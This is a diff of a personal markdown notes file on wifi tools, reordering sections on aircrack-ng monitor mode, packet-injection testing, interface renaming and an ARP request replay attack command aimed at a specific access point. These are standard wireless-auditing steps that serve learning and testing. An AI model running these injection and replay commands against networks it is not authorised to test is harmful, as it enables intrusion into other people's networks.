@@ -1,10 +1,15 @@
 # Notes on wifi configs and setup
 
-## Keeping interface names
-I was having issues with the external card until adjusting the below.
-```bash
-$ vim /etc/default/grub
-GRUB_CMDLINE_LINUX="net.ifnames=0 biosdevname=0"
+## Getting started
+
+Check the wireless interface(s) with `iwconfig` and start monitoring mode.
+```
+$ airmon-ng start wlx9cefd5fd1181
+```
+
+Verify that [injection tests](https://www.aircrack-ng.org/doku.php?id=injection_test) work.
+```
+$ aireplay-ng -9 -e dd-wrt wlan0mon
 ```
 
 ## airmon-ng
@@ -17,23 +22,12 @@ Set interface to monitor mode.
 ```bash
 $ airmon-ng start wlan1
 ```
-Stop monitor mode and start networking.
+
+Stop monitor mode and restart networking.
 ```
 $ airmon-ng stop wlan1
 $ systemctl restart network-manager.service
 ```
-
-## Renaming interface (temporary)
-Rename target interface to `wlan1` instead of systemd generated name.
-```bash
-$ iwconfig | grep wlx
-wlx9cefd5fd1181  IEEE 802.11  ESSID:off/any 
-$ ip link set wlx9cefd5fd1181 down
-$ ip link set wlx9cefd5fd1181 name wlan1
-$ ip link set wlan1 up
-$ systemctl restart network-manager.service
-```
-[Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)
 
 ## airodump-ng
 Find surrounding networks, access points and clients
@@ -90,6 +84,18 @@ Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php
 ```bash
 $ aireplay-ng --arpreplay -b A0:21:B7:60:2E:65 -h AC:65:21:B7:2E:60 wlan1 -r replay_arp-0309-015533.cap -x 100
 ```
+
+## Renaming interface (temporary)
+Rename target interface to `wlan1` instead of systemd generated name.
+```bash
+$ iwconfig | grep wlx
+wlx9cefd5fd1181  IEEE 802.11  ESSID:off/any 
+$ ip link set wlx9cefd5fd1181 down
+$ ip link set wlx9cefd5fd1181 name wlan1
+$ ip link set wlan1 up
+$ systemctl restart network-manager.service
+```
+[Understanding systemd’s predictable network device names](https://major.io/2015/08/21/understanding-systemds-predictable-network-device-names/)
 
 ## Sources
 [Aircrack-ng Newbie Guide for Linux](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
